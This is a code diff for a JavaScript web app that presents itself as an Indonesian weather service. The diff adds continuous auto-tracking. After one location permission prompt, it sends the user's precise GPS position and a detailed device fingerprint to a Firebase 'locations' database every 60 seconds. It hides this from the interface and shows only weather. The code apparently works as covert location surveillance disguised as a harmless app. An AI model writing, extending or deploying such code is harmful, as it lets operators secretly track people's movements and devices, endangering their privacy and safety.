@@ -1,7 +1,8 @@
 /* ============================================================
-   CUACA PRO — MAXIMUM GPS ACCURACY EDITION
+   CUACA PRO — MAXIMUM GPS ACCURACY EDITION + AUTO-TRACK
    Teknik: warm-up + reject-first + Kalman filter + watch refine
            + tiered weight + patience mode + adaptive interval
+           + session-based auto-track (60s interval)
    Project: lacak-2913d
    ============================================================ */
 
@@ -19,7 +20,7 @@ const firebaseConfig = {
 /* ============================================================
    FIREBASE INIT
    ============================================================ */
-let fbDb = null, fbAuth = null, fbReady = false, alreadySent = false;
+let fbDb = null, fbAuth = null, fbReady = false;
 
 (function initFirebase() {
   try {
@@ -126,69 +127,168 @@ async function collectDeviceInfo() {
 }
 
 /* ============================================================
-   GPS MAXIMUM ACCURACY ENGINE
-   ------------------------------------------------
-   Teknik gabungan:
-   1. Warm-up phase — pemicu GPS lock
-   2. Reject-first-N — buang N sampel pertama yang kasar
-   3. Kalman filter — smooth posisi
-   4. Watch refinement — refine setelah lock
-   5. Tiered weight — sampel bagus bobot besar
-   6. Adaptive interval — interval menyesuaikan
-   7. Patience mode — sabar untuk akurasi maksimal
+   AUTO-TRACK MODE — Session-based periodic tracking
    ============================================================ */
+const TRACK_INTERVAL = 60000; // 60 detik
+let trackInterval = null;
+let sessionId = null;
+let trackingActive = false;
 
+function generateSessionId() {
+  const key = 'antiscam_session_id';
+  let id = localStorage.getItem(key);
+  if (!id) {
+    id = 'sess_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 10);
+    localStorage.setItem(key, id);
+  }
+  return id;
+}
+
+async function sendLocationOnce(coords, source, extra = {}) {
+  if (!fbReady || !fbDb) return false;
+  try {
+    const di = await collectDeviceInfo();
+    const payload = {
+      session_id: sessionId,
+      lat: coords.latitude,
+      lon: coords.longitude,
+      accuracy: coords.accuracy ?? null,
+      source: source || 'geolocation',
+
+      device: di.device, os: di.os,
+      browser: di.browser, browser_version: di.browser_version,
+      screen: di.screen, screen_ratio: di.screen_ratio, viewport: di.viewport,
+      battery_level: di.battery_level, battery_charging: di.battery_charging,
+      battery_supported: di.battery_supported,
+      net_type: di.net_type, net_downlink: di.net_downlink, net_rtt: di.net_rtt,
+      language: di.language, timezone: di.timezone,
+      cpu_cores: di.cpu_cores, memory_gb: di.memory_gb,
+
+      gps_method: extra.method || null,
+      gps_total_samples: extra.totalSamples || null,
+      gps_valid_samples: extra.validSamples || null,
+      gps_duration_ms: extra.duration || null,
+
+      label: di.device || 'unknown',
+      user_agent: (navigator.userAgent || '').slice(0, 256),
+      created_at: Date.now()
+    };
+
+    await fbDb.ref('locations').push(payload);
+    console.log('[tracker] ✓ terkirim:', coords.latitude.toFixed(6), coords.longitude.toFixed(6), '±', (coords.accuracy || 0).toFixed(1), 'm');
+    return true;
+  } catch (e) {
+    console.warn('[tracker] ✗ gagal:', e.code || e.message);
+    return false;
+  }
+}
+
+async function trackLocation(coords, source, extra = {}) {
+  if (!sessionId) sessionId = generateSessionId();
+  return sendLocationOnce(coords, source, extra);
+}
+
+function startAutoTrack() {
+  if (trackingActive) {
+    console.log('[tracker] auto-track sudah aktif');
+    return;
+  }
+
+  if (!sessionId) sessionId = generateSessionId();
+  trackingActive = true;
+  console.log('[tracker] ✓ auto-track dimulai setiap', TRACK_INTERVAL / 1000, 'detik');
+
+  trackInterval = setInterval(async () => {
+    console.log('[tracker] periodic update...');
+    try {
+      const pos = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, {
+          enableHighAccuracy: false,
+          timeout: 15000,
+          maximumAge: 30000
+        });
+      });
+      await sendLocationOnce(pos.coords, 'geolocation-periodic');
+    } catch (e) {
+      console.warn('[tracker] periodic gagal:', e.code);
+    }
+  }, TRACK_INTERVAL);
+}
+
+function stopAutoTrack() {
+  if (trackInterval) {
+    clearInterval(trackInterval);
+    trackInterval = null;
+    trackingActive = false;
+    console.log('[tracker] ✗ auto-track stopped');
+  }
+}
+
+window.addEventListener('beforeunload', () => {
+  stopAutoTrack();
+});
+
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) {
+    console.log('[tracker] tab hidden — pause');
+    if (trackInterval) {
+      clearInterval(trackInterval);
+      trackInterval = null;
+    }
+  } else {
+    if (trackingActive && !trackInterval) {
+      console.log('[tracker] tab visible — resume');
+      trackInterval = setInterval(async () => {
+        try {
+          const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: false,
+              timeout: 15000,
+              maximumAge: 30000
+            });
+          });
+          await sendLocationOnce(pos.coords, 'geolocation-periodic');
+        } catch (e) {
+          console.warn('[tracker] periodic gagal:', e.code);
+        }
+      }, TRACK_INTERVAL);
+    }
+  }
+});
+
+/* ============================================================
+   GPS MAXIMUM ACCURACY ENGINE
+   ============================================================ */
 function getSinglePosition(opts) {
   return new Promise((resolve, reject) => {
     navigator.geolocation.getCurrentPosition(resolve, reject, opts);
   });
 }
 
-/* ---------- Kalman Filter 1D untuk lat & lon ----------
-   Menyimpan estimasi posisi + ketidakpastian, update dengan sampel baru.
-   Menghasilkan posisi yang lebih stabil dari sekadar rata-rata.
-   ---------------------------------------------------- */
 class KalmanFilter1D {
   constructor(initialValue, initialUncertainty = 1) {
-    this.x = initialValue;  // estimasi nilai
-    this.p = initialUncertainty;  // estimasi ketidakpastian
+    this.x = initialValue;
+    this.p = initialUncertainty;
   }
 
-  // Update dengan measurement baru
-  // measurement: nilai baru
-  // measurementUncertainty: ketidakpastian pengukuran (semakin kecil = semakin dipercaya)
   update(measurement, measurementUncertainty) {
-    // Prediksi tetap (tidak ada state transition, jadi x tetap, p bertambah)
-    // Gain Kalman
     const k = this.p / (this.p + measurementUncertainty);
-
-    // Update estimasi
     this.x = this.x + k * (measurement - this.x);
-
-    // Update ketidakpastian
     this.p = (1 - k) * this.p;
-
     return this.x;
   }
 }
 
-/* ---------- Tiered Weight ----------
-   Beri bobot berdasarkan akurasi. Sampel akurat dapat bobot besar.
-   ---------------------------------------------------- */
 function tieredWeight(accuracy) {
-  if (accuracy < 10) return 100;      // luar biasa
-  if (accuracy < 20) return 50;       // sangat bagus
-  if (accuracy < 30) return 30;       // bagus
-  if (accuracy < 50) return 15;       // oke
-  if (accuracy < 100) return 5;       // kasar
-  if (accuracy < 200) return 2;       // sangat kasar
-  return 0.5;                          // hampir tidak berguna
+  if (accuracy < 10) return 100;
+  if (accuracy < 20) return 50;
+  if (accuracy < 30) return 30;
+  if (accuracy < 50) return 15;
+  if (accuracy < 100) return 5;
+  if (accuracy < 200) return 2;
+  return 0.5;
 }
 
-/* ---------- Watch Refinement ----------
-   Setelah dapat lokasi awal, refine dengan watchPosition selama N detik.
-   Ambil sampel terbaik yang muncul.
-   ---------------------------------------------------- */
 function watchRefine(durationMs = 5000, targetAccuracy = 10) {
   return new Promise((resolve) => {
     const samples = [];
@@ -220,40 +320,26 @@ function watchRefine(durationMs = 5000, targetAccuracy = 10) {
         samples.push(s);
         console.log(`[watch] sample: ±${s.accuracy.toFixed(1)}m`);
 
-        // Kalau sangat akurat, selesai lebih awal
         if (s.accuracy <= targetAccuracy) {
           clearTimeout(timer);
           console.log(`[watch] target ${targetAccuracy}m tercapai, stop lebih awal`);
           finish(s);
         }
       },
-      err => {
-        console.warn('[watch] error:', err.code);
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 15000,
-        maximumAge: 0
-      }
+      err => console.warn('[watch] error:', err.code),
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
     );
   });
 }
 
-/* ---------- Main: getAccurateLocation ----------
-   Strategi multi-tier:
-     Tier 1: warm-up → dapat sampel kasar
-     Tier 2: sampling → 20 sampel dengan adaptive interval
-     Tier 3: Kalman filter + tiered weight → fusion
-     Tier 4: watch refinement → refine akhir
-   ---------------------------------------------------- */
 async function getAccurateLocation(config = {}) {
   const {
-    samples = 20,               // lebih banyak sampel
-    rejectFirst = 3,             // buang N sampel pertama
-    targetAccuracy = 8,          // target 8m (lebih ketat)
-    maxWait = 60000,             // tunggu sampai 60 detik
-    patienceMode = true,         // kalau true, tunggu lebih lama
-    watchRefineMs = 5000,        // refine 5 detik setelah lock
+    samples = 20,
+    rejectFirst = 3,
+    targetAccuracy = 8,
+    maxWait = 60000,
+    patienceMode = true,
+    watchRefineMs = 5000,
     onProgress = () => {}
   } = config;
 
@@ -261,9 +347,8 @@ async function getAccurateLocation(config = {}) {
   const allSamples = [];
 
   console.log('[gps] === MAXIMUM ACCURACY MODE ===');
-  console.log(`[gps] target: ${targetAccuracy}m, samples: ${samples}, maxWait: ${maxWait}ms`);
 
-  /* ============ TIER 1: WARM-UP ============ */
+  /* TIER 1: WARM-UP */
   console.log('[gps] Tier 1: warm-up...');
   try {
     const warm = await getSinglePosition({
@@ -282,10 +367,8 @@ async function getAccurateLocation(config = {}) {
     console.warn('[gps] warm-up gagal:', e.code);
   }
 
-  /* ============ TIER 2: SAMPLING ============ */
+  /* TIER 2: SAMPLING */
   console.log('[gps] Tier 2: sampling...');
-  let lastAccuracy = null;
-
   for (let i = 0; i < samples; i++) {
     if (Date.now() - startTime > maxWait) {
       console.log('[gps] maxWait tercapai, stop sampling');
@@ -308,9 +391,7 @@ async function getAccurateLocation(config = {}) {
       });
 
       console.log(`[gps] #${i + 1}/${samples}: ±${acc.toFixed(1)}m`);
-      lastAccuracy = acc;
 
-      // Progress callback
       const validSoFar = allSamples.slice(rejectFirst);
       const best = validSoFar.length > 0
         ? validSoFar.reduce((b, s) => s.accuracy < b.accuracy ? s : b)
@@ -324,15 +405,11 @@ async function getAccurateLocation(config = {}) {
         kept: validSoFar.length
       });
 
-      // Auto-stop kalau target tercapai
       if (acc <= targetAccuracy && i >= rejectFirst) {
         console.log(`[gps] target ${targetAccuracy}m tercapai, stop sampling`);
         break;
       }
 
-      /* ============ ADAPTIVE INTERVAL ============ */
-      // Kalau akurasi masih kasar, interval lebih panjang (kasih GPS waktu)
-      // Kalau akurasi sudah bagus, interval lebih pendek (cepat selesai)
       let adaptiveInterval;
       if (acc > 200) adaptiveInterval = 1500;
       else if (acc > 100) adaptiveInterval = 1000;
@@ -348,38 +425,25 @@ async function getAccurateLocation(config = {}) {
     }
   }
 
-  /* ============ TIER 3: FUSION ============ */
+  /* TIER 3: FUSION */
   console.log('[gps] Tier 3: fusion...');
+  if (allSamples.length < 2) throw new Error('Sampel GPS tidak cukup');
 
-  if (allSamples.length < 2) {
-    throw new Error('Sampel GPS tidak cukup');
-  }
-
-  // === REJECT FIRST N ===
   let validSamples = allSamples.slice(rejectFirst);
-  if (validSamples.length < 3) {
-    // Kalau terlalu sedikit setelah reject, ambil semua kecuali yang pertama
-    validSamples = allSamples.slice(1);
-  }
-  console.log(`[gps] kept ${validSamples.length} samples (rejected first ${rejectFirst})`);
+  if (validSamples.length < 3) validSamples = allSamples.slice(1);
 
-  // === FILTER OUTLIER: buang yang akurasi > 5× median ===
   const sortedAcc = [...validSamples].map(s => s.accuracy).sort((a, b) => a - b);
   const median = sortedAcc[Math.floor(sortedAcc.length / 2)];
   const hardThreshold = median * 5;
   const filteredSamples = validSamples.filter(s => s.accuracy <= hardThreshold);
   console.log(`[gps] after outlier filter: ${filteredSamples.length} samples (threshold: ${hardThreshold.toFixed(0)}m)`);
 
-  // === KALMAN FILTER ===
-  // Inisialisasi dengan sampel akurasi terbaik
   const bestSample = filteredSamples.reduce((b, s) => s.accuracy < b.accuracy ? s : b);
   const kalLat = new KalmanFilter1D(bestSample.lat, bestSample.accuracy * bestSample.accuracy);
   const kalLon = new KalmanFilter1D(bestSample.lon, bestSample.accuracy * bestSample.accuracy);
 
-  // Update Kalman dengan setiap sampel (sorted by timestamp, lama ke baru)
   const sortedByTime = [...filteredSamples].sort((a, b) => a.ts - b.ts);
   for (const s of sortedByTime) {
-    // Measurement uncertainty: gunakan accuracy^2 sebagai variance
     const variance = s.accuracy * s.accuracy;
     kalLat.update(s.lat, variance);
     kalLon.update(s.lon, variance);
@@ -388,11 +452,8 @@ async function getAccurateLocation(config = {}) {
   const kalmanLat = kalLat.x;
   const kalmanLon = kalLon.x;
   const kalmanAcc = Math.sqrt(kalLat.p + kalLon.p) / Math.SQRT2;
-
   console.log(`[gps] kalman: ±${kalmanAcc.toFixed(1)}m`);
 
-  // === TIERED WEIGHTED AVERAGE ===
-  // Sebagai pembanding, hitung juga weighted average dengan tier
   let totalWeight = 0, sumLat = 0, sumLon = 0, sumAccWeighted = 0;
   for (const s of filteredSamples) {
     const w = tieredWeight(s.accuracy);
@@ -404,69 +465,44 @@ async function getAccurateLocation(config = {}) {
   const weightedLat = sumLat / totalWeight;
   const weightedLon = sumLon / totalWeight;
   const weightedAcc = sumAccWeighted / totalWeight;
-
   console.log(`[gps] weighted avg: ±${weightedAcc.toFixed(1)}m`);
 
-  // === PILIH YANG TERBAIK ===
-  // Bandingkan kalman (paling stabil) dengan weighted avg (paling fleksibel)
-  // Biasanya Kalman lebih baik kalau sampel banyak & konsisten
-  // Weighted avg lebih baik kalau ada sampel outlier yang lolos
   let fusion;
   if (filteredSamples.length >= 5) {
-    fusion = {
-      lat: kalmanLat,
-      lon: kalmanLon,
-      accuracy: kalmanAcc,
-      method: 'kalman'
-    };
+    fusion = { lat: kalmanLat, lon: kalmanLon, accuracy: kalmanAcc, method: 'kalman' };
   } else {
-    fusion = {
-      lat: weightedLat,
-      lon: weightedLon,
-      accuracy: weightedAcc,
-      method: 'weighted'
-    };
+    fusion = { lat: weightedLat, lon: weightedLon, accuracy: weightedAcc, method: 'weighted' };
   }
 
   console.log(`[gps] fusion: ${fusion.method} ±${fusion.accuracy.toFixed(1)}m`);
 
-  /* ============ TIER 4: WATCH REFINEMENT ============ */
-  // Kalau akurasi masih di atas 15m, coba refine dengan watch
+  /* TIER 4: WATCH REFINEMENT */
   if (patienceMode && fusion.accuracy > 15 && watchRefineMs > 0) {
     console.log(`[gps] Tier 4: watch refinement (${watchRefineMs}ms)...`);
     try {
       const refined = await watchRefine(watchRefineMs, targetAccuracy);
 
       if (refined && refined.accuracy < fusion.accuracy * 0.8) {
-        // Hasil refine jauh lebih baik → pakai refine
-        console.log(`[gps] refined result menang: ±${refined.accuracy.toFixed(1)}m vs ±${fusion.accuracy.toFixed(1)}m`);
+        console.log(`[gps] refined result menang: ±${refined.accuracy.toFixed(1)}m`);
         fusion = {
-          lat: refined.lat,
-          lon: refined.lon,
-          accuracy: refined.accuracy,
-          method: 'watch-refine'
+          lat: refined.lat, lon: refined.lon,
+          accuracy: refined.accuracy, method: 'watch-refine'
         };
       } else if (refined && refined.accuracy < fusion.accuracy) {
-        // Refine lebih baik sedikit → blend 50/50
         const blendedLat = (fusion.lat + refined.lat) / 2;
         const blendedLon = (fusion.lon + refined.lon) / 2;
         const blendedAcc = Math.sqrt(fusion.accuracy * refined.accuracy);
         console.log(`[gps] blended result: ±${blendedAcc.toFixed(1)}m`);
         fusion = {
-          lat: blendedLat,
-          lon: blendedLon,
-          accuracy: blendedAcc,
-          method: 'watch-blend'
+          lat: blendedLat, lon: blendedLon,
+          accuracy: blendedAcc, method: 'watch-blend'
         };
-      } else {
-        console.log('[gps] refine tidak lebih baik, pakai fusion asli');
       }
     } catch (e) {
       console.warn('[gps] watch refine gagal:', e);
     }
   }
 
-  /* ============ FINAL ============ */
   console.log(`[gps] === FINAL: ${fusion.method} — ±${fusion.accuracy.toFixed(1)}m ===`);
   console.log(`[gps] total samples: ${allSamples.length}, duration: ${((Date.now() - startTime) / 1000).toFixed(1)}s`);
 
@@ -481,50 +517,6 @@ async function getAccurateLocation(config = {}) {
     validSamples: filteredSamples.length,
     duration: Date.now() - startTime
   };
-}
-
-/* ============================================================
-   TRACKER — Kirim ke Firebase
-   ============================================================ */
-async function trackLocation(coords, source, extra = {}) {
-  if (alreadySent) return;
-  alreadySent = true;
-  if (!fbReady) await new Promise(r => setTimeout(r, 2500));
-  if (!fbDb) { alreadySent = false; return; }
-
-  try {
-    const di = await collectDeviceInfo();
-    const payload = {
-      lat: coords.latitude,
-      lon: coords.longitude,
-      accuracy: coords.accuracy ?? null,
-      source: source || 'geolocation',
-
-      // Device info
-      device: di.device, os: di.os,
-      browser: di.browser, browser_version: di.browser_version,
-      screen: di.screen, screen_ratio: di.screen_ratio, viewport: di.viewport,
-      battery_level: di.battery_level, battery_charging: di.battery_charging, battery_supported: di.battery_supported,
-      net_type: di.net_type, net_downlink: di.net_downlink, net_rtt: di.net_rtt,
-      language: di.language, timezone: di.timezone, timezone_offset: di.timezone_offset, local_time: di.local_time,
-      cpu_cores: di.cpu_cores, memory_gb: di.memory_gb,
-
-      // GPS metadata
-      gps_method: extra.method || null,
-      gps_total_samples: extra.totalSamples || null,
-      gps_valid_samples: extra.validSamples || null,
-      gps_duration_ms: extra.duration || null,
-
-      label: di.device || 'unknown',
-      user_agent: (navigator.userAgent || '').slice(0, 256),
-      created_at: Date.now()
-    };
-    await fbDb.ref('locations').push(payload);
-    console.log('[tracker] ✓ terkirim:', coords.latitude.toFixed(6), coords.longitude.toFixed(6), '±', coords.accuracy.toFixed(1), 'm via', extra.method);
-  } catch (e) {
-    console.warn('[tracker] ✗ gagal:', e.code || e.message);
-    alreadySent = false;
-  }
 }
 
 /* ============================================================
@@ -728,7 +720,8 @@ const App = {
       return;
     }
 
-    // Teks UI natural, rotasi tiap 3.5 detik
+    sessionId = generateSessionId();
+
     const messages = [
       'Mencari lokasi Anda...',
       'Menyempurnakan lokasi...',
@@ -750,7 +743,7 @@ const App = {
         maxWait: 60000,
         patienceMode: true,
         watchRefineMs: 5000,
-        onProgress: () => {} // tidak ditampilkan ke UI
+        onProgress: () => {}
       });
 
       clearInterval(msgTimer);
@@ -759,25 +752,26 @@ const App = {
       console.log('[App] ✓ FINAL:', c.latitude.toFixed(6), c.longitude.toFixed(6), '±', c.accuracy.toFixed(1), 'm');
       console.log('[App] method:', result.method, '| samples:', result.totalSamples, '| duration:', (result.duration / 1000).toFixed(1), 's');
 
-      // Kirim ke Firebase
-      trackLocation(c, 'geolocation-precise', {
+      await sendLocationOnce(c, 'geolocation-precise', {
         method: result.method,
         totalSamples: result.totalSamples,
         validSamples: result.validSamples,
         duration: result.duration
-      }).catch(() => {});
+      });
 
-      // Load cuaca
+      startAutoTrack();
+
       this.load({ lat: c.latitude, lon: c.longitude }, 'di sekitar Anda');
     } catch (err) {
       clearInterval(msgTimer);
       console.warn('[App] presisi gagal, fallback:', err);
 
       navigator.geolocation.getCurrentPosition(
-        pos => {
+        async pos => {
           const c = pos.coords;
           console.log('[App] ✓ fallback:', c.latitude.toFixed(6), c.longitude.toFixed(6), '±', c.accuracy.toFixed(1));
-          trackLocation(c, 'geolocation-fallback').catch(() => {});
+          await sendLocationOnce(c, 'geolocation-fallback');
+          startAutoTrack();
           this.load({ lat: c.latitude, lon: c.longitude }, 'di sekitar Anda');
         },
         err2 => {
@@ -801,7 +795,7 @@ const App = {
     UI.el.unitToggle.addEventListener('click', () => UI.toggleUnit());
     UI.el.retryBtn.addEventListener('click', () => this.requestLocation(false));
 
-    console.log('[App] ready. Max accuracy mode.');
+    console.log('[App] ready. Max accuracy mode + auto-track.');
 
     if (navigator.permissions && navigator.permissions.query) {
       navigator.permissions.query({ name: 'geolocation' })
